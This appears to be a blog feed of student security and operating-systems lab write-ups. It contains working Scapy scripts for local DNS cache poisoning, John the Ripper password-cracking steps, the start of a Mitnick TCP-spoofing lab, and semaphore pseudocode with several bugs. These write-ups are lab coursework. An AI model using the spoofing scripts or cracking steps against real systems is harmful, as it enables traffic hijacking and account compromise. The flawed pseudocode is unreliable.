class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)        <span class="hljs-comment"># The Additional Section       </span>        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.2.3.4'</span>)        <span class="hljs-comment"># Construct the DNS packet</span>        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">1</span>,                an=Anssec, ns=NSsec1 ,ar=Addsec1)        <span class="hljs-comment"># Construct the entire IP packet and send it out</span>        spoofpkt = IPpkt/UDPpkt/DNSpkt        send(spoofpkt)        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53'</span>, prn=spoof_dns)</code></pre><p>  dig后的截图&amp;wireshark抓包结果</p><p>  <img src="/2020/11/13/Local-DNS-attack/6-3.PNG" srcset="/img/loading.gif" alt="6-3"></p><p>  <img src="/2020/11/13/Local-DNS-attack/6-4.PNG" srcset="/img/loading.gif" alt="6-4"></p></li></ul><h3 id="task-8：瞄准另一个域"><a href="#task-8：瞄准另一个域" class="headerlink" title="task 8：瞄准另一个域"></a>task 8：瞄准另一个域</h3><ul><li><p>实现的原理其实和上面并没有什么区别，只不过是额外多构造一个authority报文</p></li><li><p>具体实现</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):        <span class="hljs-comment"># Swap the source and destination IP address</span>        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)        <span class="hljs-comment"># Swap the source and destination port number</span>        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)        <span class="hljs-comment"># The Answer Section</span>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.0.2.123'</span>)        <span class="hljs-comment"># The Authority Section</span>        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)        NSsec2 = DNSRR(rrname=<span class="hljs-string">'google.com'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">260000</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)         <span class="hljs-comment"># The Additional Section</span>        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>)        Addsec2 = DNSRR(rrname=<span class="hljs-string">'attacker32,com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'5.6.7.8'</span>)                <span class="hljs-comment"># Construct the DNS packet</span>        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">2</span>, arcount=<span class="hljs-number">2</span>,                an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2) <span class="hljs-comment">#ar=Addsec1</span>        <span class="hljs-comment"># Construct the entire IP packet and send it out</span>        spoofpkt = IPpkt/UDPpkt/DNSpkt        send(spoofpkt)        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53 '</span>, prn=spoof_dns)</code></pre><p>  运行截图，可以看到已经添加</p><p>  <img src="/2020/11/13/Local-DNS-attack/8-1.PNG" srcset="/img/loading.gif" alt="8-1"></p></li></ul><h3 id="task-9：针对Additional部分"><a href="#task-9：针对Additional部分" class="headerlink" title="task 9：针对Additional部分"></a>task 9：针对Additional部分</h3><ul><li><p>具体实现</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):        <span class="hljs-comment"># Swap the source and destination IP address</span>        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)        <span class="hljs-comment"># Swap the source and destination port number</span>        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)        <span class="hljs-comment"># The Answer Section</span>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'123.123.123.123'</span>)        <span class="hljs-comment"># The Authority Section</span>        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'attacker32.com'</span>)        NSsec2 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'ns.example.net'</span>)        <span class="hljs-comment"># The Additional Section</span>        Addsec1 = DNSRR(rrname=<span class="hljs-string">'attacker32.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>)        Addsec2 = DNSRR(rrname=<span class="hljs-string">'ns.example.net'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'5.6.7.8'</span>)        Addsec3 = DNSRR(rrname=<span class="hljs-string">'www.facebook.com'</span>, type=<span class="hljs-string">'A'</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'3.4.5.6'</span>)        <span class="hljs-comment"># Construct the DNS packet</span>        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,                 qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">2</span>, arcount=<span class="hljs-number">3</span>,                an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3)         <span class="hljs-comment"># Construct the entire IP packet and send it out</span>        spoofpkt = IPpkt/UDPpkt/DNSpkt        send(spoofpkt)        <span class="hljs-comment"># Sniff UDP query packets and invoke spoof_dns().</span>pkt = sniff(filter=<span class="hljs-string">'udp and dst port 53'</span>, prn=spoof_dns)</code></pre><p>  dig之后的显示</p><p>  <img src="/2020/11/13/Local-DNS-attack/9-1.PNG" srcset="/img/loading.gif" alt="9-1"></p><p>  之后观察DNS缓存的情况</p><p>  <img src="/2020/11/13/Local-DNS-attack/9-2.PNG" srcset="/img/loading.gif" alt="9-2"></p><p>  看到在additional部分中只有attacker32.com -&gt;1.2.3.4和ns.example.net -&gt;5.6.7.8成功的存入DNS缓存，我认为这是由于只有在Additional和Authority匹配的时候才会存入DNS缓存当中</p></li></ul><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>口令破解实验</title>
    <link href="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/"/>
    <url>/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="实验目的-amp-要求"><a href="#实验目的-amp-要求" class="headerlink" title="实验目的&amp;要求"></a>实验目的&amp;要求</h1><ul><li>熟悉和掌握正确的口令设计规则</li><li>熟悉常见的防御口令攻击的方法</li></ul><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="Wordlist-mode"><a href="#Wordlist-mode" class="headerlink" title="Wordlist mode"></a>Wordlist mode</h2><ul><li><p>首先需要先创建一个新的用户：test，并把密码设置为password</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>  此时/etc/passwd和/etc/shadow两个文件会包含对应的用户的hash值，而需要将这两个文件通过unshadow命令来进行提取hash值并放入一个txt文件中</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>  之后在查看john在字典模式下所需要的字典</p><blockquote><p>字典位于/user/share/john/password.lst</p></blockquote><p>  来进行用户名和密码的破解</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p>  还有一个是根目录，即root，不知道为什么并没有显示破解成功，但是在进行sudo su的时候（切换到root权限的时候）并没有要求输入密码</p></li><li><p>复盘：整个过程其实就是将对应的hash值进行提取，并放入到一个文件中，之后就用字典挨个查找即可，所以比较关键的地方在于字典的选择/构造</p></li></ul><h2 id="Single-Crack-mode"><a href="#Single-Crack-mode" class="headerlink" title="Single Crack mode"></a>Single Crack mode</h2><blockquote><p>根据用户名来设置密码，我们就需要John -Single 这个命令，原理是根据用户的名称，加上常见的变化而猜测密码。</p></blockquote><ul><li><p>首先新建用户：test_password，密码设置为test_password123</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>  后面步骤和上面wordlist步骤一样，都是unshadow进行提取，之后开始用-single来进行破解</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>  可以看到与用户名test_password明显相关的密码test_password123被破解</p></li></ul><h2 id="Incremental-mode"><a href="#Incremental-mode" class="headerlink" title="Incremental mode"></a>Incremental mode</h2><ul><li><p>创建新的账户incremental，密码设置为了123，用的是增量模式下面的数字字符集</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>  之后unshadow提取，并用john –incremental=digits命令破解</p><p>  <img src="/2020/11/10/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E5%AE%9E%E9%AA%8C/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>  而另外的root和seed账户的密码由于并不是数字字符集构成，所以只能破解出incremental账户的内容</p></li></ul><blockquote><p>这是最强大的破解模式，它可以尝试所有可能的字符组合作为密码。但是，假定这种模式的破解永远不会终止，因为组合的数量太大(实际上，如果您设置了较低的密码长度限制或使用较小的字符集，它就会终止)，并且您必须更早地中断它。</p><p>这就是为什么这种模式处理三谱图频率，分别处理每个字符位置和每个密码长度，以便在有限的时间内破解尽可能多的密码。</p><p>要使用该模式，您需要为该模式的参数定义一个特定的定义，包括密码长度限制和要使用的字符集。这些参数是在名为[Incremental:MODE ]的配置文件部分中定义的，其中MODE是您指定给该模式的任何名称(这是您需要在John的命令行中指定的名称)。您可以使用预定义的增量模式定义，也可以定义自定义模式。</p><p>在版本1.8.0中,预定义的incremental模式是“ASCII”(所有95个打印的ASCII字符),“LM_ASCII”(使用LM哈希),“Alnum”(所有62个字母数字字符),“Alpha”(所有52个字母),“LowerNum”(小写的字母+数字,总共36位),“UpperNum”(大写字母+数字,总共36位),“LowerSpace”(小写字母+空格,总共27位),“Lower”(小写字母),“Upper”(大写字母),和“Digits”(仅数字)。提供的.chr文件包括所有这些模式的长度不超过13的数据，除了“LM_ASCII”(其中输入到LM散列的密码部分假定被截断为长度7)和“位数”(其中提供的.chr文件和预定义的incremental模式的长度为20)。这些预定义增量模式所需的许多.chr文件中的一些可能不会与John the Ripper的每个版本捆绑在一起，可以单独下载。</p></blockquote><h2 id="External-mode"><a href="#External-mode" class="headerlink" title="External mode"></a>External mode</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Software security lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>同步互斥lab</title>
    <link href="/2020/11/06/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5lab/"/>
    <url>/2020/11/06/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5lab/</url>
    
    <content type="html"><![CDATA[<h1 id="同步互斥lab"><a href="#同步互斥lab" class="headerlink" title="同步互斥lab"></a>同步互斥lab</h1><h2 id="复旦早餐王问题"><a href="#复旦早餐王问题" class="headerlink" title="复旦早餐王问题"></a>复旦早餐王问题</h2><ul><li><p>Q1：关系分析。请写出题目中存在的互斥和同步的关系</p><ul><li>首先是是老板和老板娘这两种进程的关系，是互斥的</li><li>其次是两个队列中消费者的关系，是互斥而非同步的，即没有某种依赖关系，而是对于篮子的访问时相互排斥的</li><li>最后是老板和老板娘作为生产者和消费者之间的进程关系，是同步的，即存在某种关系的</li></ul></li><li><p>Q2：上述关系可以抽象为几个进程？请写出伪代码表示</p><p>  可以抽象为两个生产者，两个消费者进程队列</p><ul><li><p>代码设计：首先窗口设置为有界缓冲区（用一个变量content来表示篮子）</p><ul><li>其次，采取信号量的方式，需要信号量sem_content来实现所有进程对于content的访问的相互互斥（mutual exclusion）</li><li>还有还需要信号量Egg和Pancake来实现消费者和生产者之间的对于可以吃的鸡蛋灌饼/煎饼的数量的同步</li></ul><pre><code class="hljs c"><span class="hljs-keyword">int</span> content;       <span class="hljs-comment">//表示篮子的空间，0表示没有东西，1表示煎饼果子，2表示鸡蛋灌饼</span>semaphore sem_content; <span class="hljs-comment">//用来对共享资源content的访问加锁，防止因为线程的并发对数据读写的影响</span>semaphore Egg,Pancake; <span class="hljs-comment">//用来实现生产者消费者对于鸡蛋灌饼和煎饼果子的数目的同步</span><span class="hljs-comment">//####### initialization ########</span>sem_content.count = <span class="hljs-number">1</span>;       <span class="hljs-comment">//只有一个进程能访问这个篮子</span>Egg.count = Pancake.count = <span class="hljs-number">0</span>;   <span class="hljs-comment">//刚开始的时候篮子里面并没有东西</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">producer_male</span><span class="hljs-params">()</span>   <span class="hljs-comment">//生产煎饼果子</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    &#123;        wait(sem_content);         <span class="hljs-keyword">if</span> (sem_content == <span class="hljs-number">0</span> &amp;&amp; content == <span class="hljs-number">0</span>) <span class="hljs-comment">//篮子中没有东西</span>        &#123;            content = <span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//do nothing</span>        &#125;                signal(sem_content);        signal(Egg);    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">producer_female</span><span class="hljs-params">()</span>   <span class="hljs-comment">//生产鸡蛋灌饼</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    &#123;        wait(sem_content);        <span class="hljs-keyword">if</span>(sem_content == <span class="hljs-number">0</span> &amp;&amp; content == <span class="hljs-number">0</span>)        &#123;            content = <span class="hljs-number">2</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//do nothing</span>        &#125;        signal(sem_content);        signal(Pancake);    &#125;    &#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consumer_Egg</span><span class="hljs-params">()</span>   <span class="hljs-comment">//消费鸡蛋灌饼的，由于是一直在排队，所以简化为while循环，用一个进程来代替</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)    &#123;        wait(Egg);   <span class="hljs-comment">//如果篮子里面没有鸡蛋灌饼，就进行阻塞，直到出现了鸡蛋灌饼为止</span>        wait(sem_content);        <span class="hljs-keyword">if</span>(sem_content == <span class="hljs-number">0</span> &amp;&amp; content = <span class="hljs-number">2</span>)        &#123;            content = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//do nothing</span>        &#125;        signal(sem_content)    &#125;&#125;<span class="hljs-keyword">void</span> consumer_Pancake()  <span class="hljs-comment">//消费煎饼果子的</span>&#123;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    &#123;        wait(Pancake);        wait(sem_content);        <span class="hljs-keyword">if</span>(sesm_content == <span class="hljs-number">0</span> &amp;&amp; content = <span class="hljs-number">1</span>)        &#123;            content = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//do nothing</span>        &#125;        signal(sem_content);    &#125;    &#125;</code></pre></li></ul></li></ul><h2 id="小小打印店"><a href="#小小打印店" class="headerlink" title="小小打印店"></a>小小打印店</h2><p>在了解完题目之后，我认为这题属于是典型的理发店模型，但是进行了简化，典型的理发店模型除了排队的队列以外，还允许等待的顾客站着等待，而这里则不同，是属于排队队列没有空位就会离开；同时还简化了收费的模型</p><ul><li><p>Q1：关系分析。请写出题目中存在的互斥和同步的关系</p><ul><li><p>首先，在这里面我将打印机设计为了一个进程，那么需要mutual这个信号量来实现<strong>正在打印的这个同学与其他等待的进程之间的互斥</strong></p></li><li><p>其次，在这里还有一个是打印机与同学之间的同步关系，打印机进程发现没人打印的时候会进行sleep，而同学必须<strong>先发送一个request</strong>，然后打印机<strong>才开始打印</strong>，并且在之后也是打印机要<strong>先发送信号说明打印机打印已经完成</strong>，之后打印的同学才能离开，画了一张简单的图来说明关系</p><p>  <img src="/2020/11/06/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5lab/%E6%89%93%E5%8D%B0%E5%BA%97%E6%A8%A1%E5%9E%8B.png" srcset="/img/loading.gif" alt="打印店模型"></p></li></ul></li><li><p>Q2：上述关系可以抽象为几个进程？ 并写出伪代码描述。</p><ul><li><p>分为两个进程，打印机进程以及同学进程</p></li><li><p>设计文档</p><ul><li><p>首先，用max_capacity来表示空闲的余量，初始化为n+1（等待区最多有n个位置，打印区1个），用信号量waiting来表示当前的等待区的余量，初始化为n</p></li><li><p>其次，采取信号量mutual的方式来实现同学进程对于打印位置这一共享资源的互斥访问</p></li><li><p>用信号量request和finish来实现打印机进程和同学进程之间的同步</p><table><thead><tr><th align="center">信号量</th><th align="center">wait operation</th><th align="center">signal operation</th></tr></thead><tbody><tr><td align="center">max_capacity</td><td align="center">student waits for a space</td><td align="center">the printing student finish and leabe</td></tr><tr><td align="center">waiting</td><td align="center">student waits for a spacec in the waiting queue</td><td align="center">the first waiting student is going to execute the printing job</td></tr><tr><td align="center">mutual</td><td align="center">the student waits that the resource to print</td><td align="center">the student finish printing and the resource can be use</td></tr><tr><td align="center">request</td><td align="center">the print process sleep until the resource is occupied</td><td align="center">the printing student signals the printer to print</td></tr><tr><td align="center">finish</td><td align="center">the student wait until the printer finish printing job</td><td align="center">the printer signals the student printing job is finish</td></tr></tbody></table></li><li><p>同时我引入了waiting_on_line（）函数，在这里仅仅表示在队列中排队的过程，因为waiting这个信号量只是说在等待进入到waiting的队列中，但是实际上还需要等待前面的student进程打印完才行</p></li><li><p>同上，引入printing_job（）函数来说明打印机进程完成打印的过程</p></li></ul><pre><code class="hljs c"><span class="hljs-comment">//######### Initialization #########</span>semaphore mutual.count = <span class="hljs-number">1</span>;    <span class="hljs-comment">// only one student process can enter the resource</span>semaphore max_capacity.count = n + <span class="hljs-number">1</span>;semaphore waiting.count = n;semaphore request.count = <span class="hljs-number">0</span>;semaphore finish.coount = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">student</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    wait(max_capacity); <span class="hljs-comment">//进入打印店</span>    wait(waiting);         <span class="hljs-comment">//开始排队</span>    waiting_on_line();    signal(waiting);      <span class="hljs-comment">//排队结束，准备访问对应的resource</span>    wait(mutual);         <span class="hljs-comment">//对于访问的resource实现互斥</span>    signal(request);      <span class="hljs-comment">//唤醒打印机进程来进行打印</span>    wait(finish);         <span class="hljs-comment">//等待结束中</span>    signal(mutual);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printer</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">while</span> (ture)    &#123;        wait(request);    <span class="hljs-comment">//等待唤醒，否则处于阻塞状态（休眠）</span>        printing_job();   <span class="hljs-comment">//进行打印工作</span>        signal(finish);   <span class="hljs-comment">//打印完了之后通知等待的学生打印工作完成</span>    &#125;    &#125;</code></pre></li></ul></li></ul><h2 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h2><ul><li><p>问题描述：</p><p>  ​    由Dijkstra提出并解决的哲学家就餐问题是典型的同步问题。该问题描述的是五个哲学家共用一张圆桌，分别坐在周围的五张椅子上，在圆桌上有五个碗和五只筷子，他们的生活方式是交替的进行思考和进餐。平时，一个哲学家进行思考，饥饿时便试图取用其左右最靠近他的筷子，只有在他拿到两只筷子时才能进餐。进餐完毕，放下筷子继续思考。</p></li><li><p>解决思路：</p><p>  首先是异步和同步的区别，参考blog：<a href="https://blog.csdn.net/zf2014122891/article/details/84557098?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160492245819725225053685%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160492245819725225053685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-84557098.pc_first_rank_v2_rank_v28&utm_term=%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88&spm=1018.2118.3001.4449" target="_blank" rel="noopener">同步和异步的区别及优缺点</a></p><p>  在这里不同的哲学家可以干不同的事情，采用异步的方式，用线程的方式来实现，最为基本的解决思路就是通过信号量来实现对筷子使用的互斥</p>  <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">philosopher</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>* arg)</span> </span>&#123;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;        think();        hungry();        pthread_mutex_lock(&amp;chopsticks[left]);        pthread_mutex_lock(&amp;chopsticks[right]);        eat();        pthread_mutex_unlock(&amp;chopsticks[left]);            pthread_mutex_unlock(&amp;chopsticks[right]);    &#125;&#125;</code></pre><p>  但是可以发现，会引起死锁问题，当每一个哲学家都拿起了自己右/左边筷子的时候，会发现由于hold and wait，会引发死锁问题，开始考虑对于死锁问题的解决</p><ul><li><p>所以，在这里想到了的方法是限制哲学家同时拿一个方向上（如：左边）的筷子的人数数量，设置为4，这样当编号为4的哲学家想要拿左边编号为4的筷子的时候就进行了阻塞，此时编号为3的哲学家可以拿起右边的筷子进行吃饭</p><p>具体代码附在后面（philosopher.c），运行截图如下</p><p><img src="/2020/11/06/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"philosopher.h"</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">philosopher</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *philosopherNumber)</span> </span>&#123;<span class="hljs-keyword">int</span> i = (<span class="hljs-keyword">int</span>) philosopherNumber;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;think(i);       <span class="hljs-comment">//the philosopher[i] start to think</span><span class="hljs-comment">//the philosopher[i] stop thinking</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Philosopher %d is hungry now\n"</span>,i);pickUp(i);     <span class="hljs-comment">//pick up the chopstick</span>eat(i);        <span class="hljs-comment">//如果能执行到这一步而不阻塞在pickUp（），就说明已经获得了左右两根筷子，可以开始吃饭了</span>putDown(i);&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">think</span><span class="hljs-params">(<span class="hljs-keyword">int</span> philosopherNumber)</span> </span>&#123;<span class="hljs-keyword">int</span> sleepTime = rand() % <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Philosopher %d will think for %d seconds\n"</span>, philosopherNumber, sleepTime);sleep(sleepTime);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pickUp</span><span class="hljs-params">(<span class="hljs-keyword">int</span> philosopherNumber)</span> </span>&#123;<span class="hljs-comment">// request chopsticks</span>    <span class="hljs-comment">//give the stick a sem and wait</span>sem_wait(&amp;num);pthread_mutex_lock(&amp;chopsticks[philosopherNumber]);pthread_mutex_lock(&amp;chopsticks[((philosopherNumber + <span class="hljs-number">1</span>) % <span class="hljs-number">5</span>)]);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> philosopherNumber)</span> </span>&#123;<span class="hljs-keyword">int</span> eatTime = rand() % <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Philosopher %d will eat for %d seconds\n"</span>, philosopherNumber, eatTime);sleep(eatTime);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">putDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> philosopherNumber)</span> </span>&#123;<span class="hljs-comment">// release chopsticks</span>    <span class="hljs-comment">//signal() the chopstick</span>pthread_mutex_unlock(&amp;chopsticks[philosopherNumber]);pthread_mutex_unlock(&amp;chopsticks[((philosopherNumber + <span class="hljs-number">1</span>) % <span class="hljs-number">5</span>)]);sem_post(&amp;num);&#125;</code></pre></li></ul></li></ul><p><strong>提交说明</strong></p><p>1，2相应的code在breakfast.cpp和print.cpp文件中，3的可执行文件为a.out</p>]]></content>
    
    
    
    <tags>
      
      <tag>Operating System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mitnick Attack</title>
    <link href="/2020/11/05/Mitnick-Attack/"/>
    <url>/2020/11/05/Mitnick-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="Mitnick-Attack-lab"><a href="#Mitnick-Attack-lab" class="headerlink" title="Mitnick Attack lab"></a>Mitnick Attack lab</h1><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h2 id="Task-1：模拟SYN洪泛"><a href="#Task-1：模拟SYN洪泛" class="headerlink" title="Task 1：模拟SYN洪泛"></a>Task 1：模拟SYN洪泛</h2><ul><li><p>在这里实现模拟SYN洪泛的根本目的是使trusted的server静音或者关闭，因为当伪装的SYN请求发送后，X会发送一个SYN ACK包给Trusted，而Trusted并没有发送之前的SYN请求，就会发送一个RST包来放弃这个连接</p></li><li><p>将<strong>Trusted（10.0.2.7）</strong>断开网络</p></li><li><p>在<strong>X-Terminal（10.0.2.5）</strong>插入相应的静态的arp缓存</p>  <pre><code class="hljs angelscript">sudo arp -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">0f</span></code></pre><p>  <img src="/2020/11/05/Mitnick-Attack/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p></li></ul><h2 id="Task-2：欺骗TCP连接和rsh会话"><a href="#Task-2：欺骗TCP连接和rsh会话" class="headerlink" title="Task 2：欺骗TCP连接和rsh会话"></a>Task 2：欺骗TCP连接和rsh会话</h2><h3 id="Task-2-1：欺骗第一个TCP连接"><a href="#Task-2-1：欺骗第一个TCP连接" class="headerlink" title="Task 2.1：欺骗第一个TCP连接"></a>Task 2.1：欺骗第一个TCP连接</h3><h4 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h4><ul><li><p>实现原理就是很简单的TCP数据包的伪造</p></li><li><p>具体的py文件内容如下</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-comment"># 'U': URG bit</span><span class="hljs-comment"># 